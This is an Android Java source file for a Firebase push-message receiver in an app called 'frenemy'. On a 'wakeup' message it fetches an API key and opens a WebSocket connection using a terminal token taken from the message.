package com.theah64.frenemy.android.firebase;

import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.theah64.frenemy.android.models.SocketMessage;
import com.theah64.frenemy.android.utils.APIRequestGateway;
import com.theah64.frenemy.android.utils.AdvancedWebSocketClient;
import com.theah64.frenemy.android.utils.WebSocketHelper;

import java.util.Map;

public class FCMReceiver extends FirebaseMessagingService {

    private static final String X = FCMReceiver.class.getSimpleName();

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.d(X, "FCM MSG RECEIVED: " + remoteMessage);
        Map<String, String> payload = remoteMessage.getData();
        Log.i(X, "FCM says : " + payload);

        final String type = payload.get("type");

        if (type.equals("wakeup")) {
            //It's a wakeup request
            final String terminalToken = payload.get("terminal_token");
            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey, String frenemyId) {
                    AdvancedWebSocketClient helper = WebSocketHelper.getInstance(FCMReceiver.this).getHelper(terminalToken, apiKey);
                }

                @Override
                public void onFailed(String reason) {

                }
            });
        }
    }

}
